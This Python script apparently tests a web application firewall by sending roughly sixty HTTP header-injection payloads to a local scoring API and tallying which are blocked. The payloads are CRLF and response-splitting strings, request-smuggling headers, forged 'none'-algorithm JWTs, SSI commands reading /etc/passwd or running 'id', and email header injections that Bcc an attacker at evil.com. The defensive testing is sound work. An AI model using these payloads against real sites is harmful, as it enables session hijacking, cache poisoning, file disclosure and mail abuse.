#!/usr/bin/env python3
"""
HTTP Header Injection & CRLF Attack Test Suite
Tests header injection and response splitting techniques against the WAF
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# Header Injection & CRLF Payloads
HEADER_INJECTION_ATTACKS = [
    # Basic CRLF Injection
    {"name": "Basic CRLF newline", "path": "/api/redirect", "query": {"url": "http://example.com%0d%0aX-Injected: true"}},
    {"name": "CRLF Set-Cookie", "path": "/api/login", "query": {"next": "/%0d%0aSet-Cookie: session=evil"}},
    {"name": "CRLF Location", "path": "/api/goto", "query": {"dest": "/%0d%0aLocation: http://evil.com"}},
    {"name": "Double CRLF body", "path": "/api/return", "query": {"url": "http://x%0d%0a%0d%0a<script>alert(1)</script>"}},
    {"name": "URL encoded CRLF", "path": "/api/forward", "query": {"to": "http://test.com%0D%0AX-Attack: true"}},
    {"name": "Unicode CRLF", "path": "/api/link", "query": {"url": "http://test.com\r\nX-Injected: header"}},

    # Response Splitting
    {"name": "Response split basic", "path": "/api/page", "query": {"name": "test%0d%0a%0d%0a<html>Fake</html>"}},
    {"name": "Response split XSS", "path": "/api/view", "query": {"id": "1%0d%0a%0d%0a<script>alert(1)</script>"}},
    {"name": "Response split redirect", "path": "/api/nav", "query": {"url": "test%0d%0aLocation:%20http://evil.com%0d%0a%0d%0a"}},
    {"name": "Response split cookie", "path": "/api/set", "query": {"value": "x%0d%0aSet-Cookie:%20admin=true%0d%0a%0d%0a"}},

    # Header Overwrite
    {"name": "Host header poison", "path": "/api/reset", "headers": {"Host": "evil.com"}},
    {"name": "X-Forwarded-Host poison", "path": "/api/password", "headers": {"X-Forwarded-Host": "evil.com"}},
    {"name": "X-Forwarded-Proto", "path": "/api/secure", "headers": {"X-Forwarded-Proto": "http"}},
    {"name": "X-Original-URL", "path": "/api/admin", "headers": {"X-Original-URL": "/admin/delete"}},
    {"name": "X-Rewrite-URL", "path": "/api/user", "headers": {"X-Rewrite-URL": "/admin"}},
    {"name": "X-Custom-IP-Auth", "path": "/api/internal", "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},

    # Request Smuggling Patterns
    {"name": "CL.TE smuggle", "path": "/api/smuggle", "headers": {"Content-Length": "6", "Transfer-Encoding": "chunked"}},
    {"name": "TE.CL smuggle", "path": "/api/tunnel", "headers": {"Transfer-Encoding": "chunked", "Content-Length": "3"}},
    {"name": "TE.TE obfuscation", "path": "/api/proxy", "headers": {"Transfer-Encoding": "chunked", "Transfer-encoding": "identity"}},
    {"name": "Double Content-Length", "path": "/api/parse", "headers": {"Content-Length": "0", "Content-Length": "44"}},

    # Cache Poisoning
    {"name": "Cache key poison", "path": "/api/static/script.js", "headers": {"X-Forwarded-Host": "evil.com"}},
    {"name": "Web cache deception", "path": "/api/account/settings.css", "headers": {"Accept": "text/css"}},
    {"name": "Cache via X-Forwarded-Scheme", "path": "/api/resource", "headers": {"X-Forwarded-Scheme": "nothttps"}},
    {"name": "Vary header abuse", "path": "/api/profile", "headers": {"Origin": "https://evil.com"}},

    # Cookie Injection
    {"name": "Cookie injection CRLF", "path": "/api/session", "query": {"token": "valid%0d%0aSet-Cookie: admin=true"}},
    {"name": "Cookie overflow", "path": "/api/prefs", "headers": {"Cookie": "a=" + "B" * 4096}},
    {"name": "Cookie attribute inject", "path": "/api/auth", "query": {"session": "x; Path=/; Domain=.evil.com"}},
    {"name": "Cookie SameSite bypass", "path": "/api/csrf", "headers": {"Cookie": "session=x; SameSite=None"}},

    # Authentication Header Attacks
    {"name": "Basic auth injection", "path": "/api/private", "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="}},
    {"name": "Bearer token forge", "path": "/api/secure", "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."}},
    {"name": "JWT none algorithm", "path": "/api/jwt", "headers": {"Authorization": "Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."}},
    {"name": "NTLM relay", "path": "/api/windows", "headers": {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}},

    # CORS Header Manipulation
    {"name": "CORS wildcard origin", "path": "/api/cors", "headers": {"Origin": "https://evil.com"}},
    {"name": "CORS null origin", "path": "/api/data", "headers": {"Origin": "null"}},
    {"name": "CORS reflection", "path": "/api/cross", "headers": {"Origin": "https://attacker.com"}},
    {"name": "CORS credentials", "path": "/api/sensitive", "headers": {"Origin": "https://evil.com", "Access-Control-Request-Credentials": "true"}},

    # Content-Type Attacks
    {"name": "Content-Type confusion", "path": "/api/upload", "headers": {"Content-Type": "text/html"}},
    {"name": "MIME sniffing", "path": "/api/file", "headers": {"Content-Type": "application/octet-stream", "X-Content-Type-Options": ""}},
    {"name": "Charset injection", "path": "/api/text", "headers": {"Content-Type": "text/html; charset=UTF-7"}},
    {"name": "Multipart boundary", "path": "/api/form", "headers": {"Content-Type": "multipart/form-data; boundary=evil"}},

    # Method Override
    {"name": "X-HTTP-Method-Override", "path": "/api/resource", "headers": {"X-HTTP-Method-Override": "DELETE"}},
    {"name": "X-Method-Override", "path": "/api/item", "headers": {"X-Method-Override": "PUT"}},
    {"name": "Override to TRACE", "path": "/api/debug", "headers": {"X-HTTP-Method-Override": "TRACE"}},
    {"name": "Override to CONNECT", "path": "/api/tunnel", "headers": {"X-HTTP-Method-Override": "CONNECT"}},

    # Server-Side Includes (SSI)
    {"name": "SSI include", "path": "/api/template", "headers": {"X-SSI-Inject": "<!--#include virtual=\"/etc/passwd\" -->"}},
    {"name": "SSI exec", "path": "/api/render", "query": {"name": "<!--#exec cmd=\"id\" -->"}},
    {"name": "ESI injection", "path": "/api/cache", "headers": {"Surrogate-Control": "<esi:include src=\"http://evil.com/\"/>"}},

    # Log Injection
    {"name": "Log injection newline", "path": "/api/log", "headers": {"User-Agent": "Mozilla\n[CRITICAL] Fake log entry"}},
    {"name": "Log injection format", "path": "/api/audit", "headers": {"User-Agent": "%n%n%n%n%n"}},
    {"name": "Log injection XSS", "path": "/api/access", "headers": {"Referer": "<script>alert(1)</script>"}},

    # Email Header Injection
    {"name": "Email header inject", "path": "/api/contact", "body": {"email": "test@test.com%0d%0aBcc: attacker@evil.com"}},
    {"name": "Email subject inject", "path": "/api/feedback", "body": {"subject": "Hello%0d%0aBcc: attacker@evil.com%0d%0a"}},
    {"name": "SMTP injection", "path": "/api/notify", "body": {"to": "victim@test.com\r\nRCPT TO: attacker@evil.com"}},

    # Encoding Variations
    {"name": "UTF-8 CRLF", "path": "/api/encode", "query": {"data": "test\xc4\x8d\xc4\x8aX-Injected: true"}},
    {"name": "Double encode CRLF", "path": "/api/decode", "query": {"url": "%250d%250aSet-Cookie:%20evil=true"}},
    {"name": "Null byte header", "path": "/api/null", "query": {"param": "value%00%0d%0aX-Injected: true"}},
    {"name": "Tab character", "path": "/api/tab", "query": {"value": "test%09%0d%0aX-Injected: true"}},

    # Hidden in legitimate requests
    {"name": "Redirect param CRLF", "path": "/api/oauth/callback", "query": {"redirect_uri": "http://app.com%0d%0aSet-Cookie:%20token=stolen"}},
    {"name": "Filename header inject", "path": "/api/download", "query": {"file": "report.pdf%0d%0aContent-Disposition:%20attachment;filename=evil.exe"}},
    {"name": "Language header inject", "path": "/api/i18n", "headers": {"Accept-Language": "en%0d%0aX-Injected: true"}},
]

def test_payload(attack: Dict) -> Dict:
    """Test a single header injection payload against WAF"""
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Content-Type": "application/json"
    }

    # Merge attack headers with base headers
    headers = {**base_headers, **attack.get("headers", {})}

    payload = {
        "method": "POST" if "body" in attack else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": headers
    }

    body = attack.get("body")
    if body:
        payload["body"] = json.dumps(body) if isinstance(body, dict) else body

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0)
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}

def main():
    print("=" * 70)
    print("HTTP HEADER INJECTION & CRLF ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(HEADER_INJECTION_ATTACKS)} header injection payloads...\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(HEADER_INJECTION_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(f"[{i:02d}/{len(HEADER_INJECTION_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}")
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(HEADER_INJECTION_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = detected / (len(HEADER_INJECTION_ATTACKS) - errors) * 100 if (len(HEADER_INJECTION_ATTACKS) - errors) > 0 else 0
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)

if __name__ == "__main__":
    main()
